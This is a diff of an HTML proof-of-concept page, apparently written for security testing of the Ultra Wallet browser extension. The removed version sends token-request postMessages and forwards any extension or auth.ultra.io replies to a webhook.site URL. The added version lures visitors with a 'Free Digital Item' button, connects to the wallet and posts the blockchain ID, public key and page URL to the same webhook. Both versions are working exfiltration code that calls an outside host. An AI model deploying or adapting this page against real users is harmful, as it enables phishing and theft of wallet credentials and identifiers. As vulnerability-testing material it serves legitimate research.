@@ -1,48 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ultra Wallet PoC</title>
-  <script>
-    // Listen for responses from Ultra Wallet extension or auth iframe
-    window.addEventListener("message", function (event) {
-      if (
-        event.origin.startsWith("chrome-extension://") ||
-        event.origin.includes("auth.ultra.io")
-      ) {
-        fetch("https://webhook.site/b8db8262-3b89-4f75-9056-9438c014bed1", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            origin: event.origin,
-            data: event.data,
-            location: window.location.href,
-            userAgent: navigator.userAgent
-          })
-        });
-      }
-    });
-
-    // Send various token-related postMessages
-    window.onload = function () {
-      const payloads = [
-        { type: "ultra:getTokens" },
-        { type: "oauth2:getTokens" },
-        { type: "ultra:getIdentity" },
-        { type: "ultra:getAuthState" },
-        { type: "get_auth_tokens" },
-        { type: "ultra:getAccessToken" }
-      ];
-
-      payloads.forEach((msg, i) => {
-        setTimeout(() => {
-          window.postMessage(msg, "*");
-        }, i * 700);
-      });
-    };
-  </script>
+  <title>Ultra Malicious dApp PoC</title>
 </head>
 <body>
-  <h1>🎁 Claim Free NFT</h1>
-  <p>This page will auto-check for connected Ultra Wallet tokens.</p>
+  <h1>🎁 Free Digital Item</h1>
+  <button id="connect">Connect Wallet</button>
+
+  <script>
+    document.getElementById('connect').onclick = async () => {
+      try {
+        const resp = await window.ultra.connect();
+        // At this point, the dApp is trusted and connected
+
+        // Proof-of-concept: Exfiltrate tokens via postMessage or invisible fetch:
+        const data = {
+          connected: true,
+          blockchainId: resp.data.blockchainid,
+          publicKey: resp.data.publicKey,
+          url: window.location.href
+        };
+
+        fetch('https://webhook.site/b8db8262-3b89-4f75-9056-9438c014bed1', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        console.error('Connection failed', e);
+      }
+    };
+  </script>
+
+  <script src="https://unpkg.com/ultra-wallet-extension"></script>
 </body>
 </html>
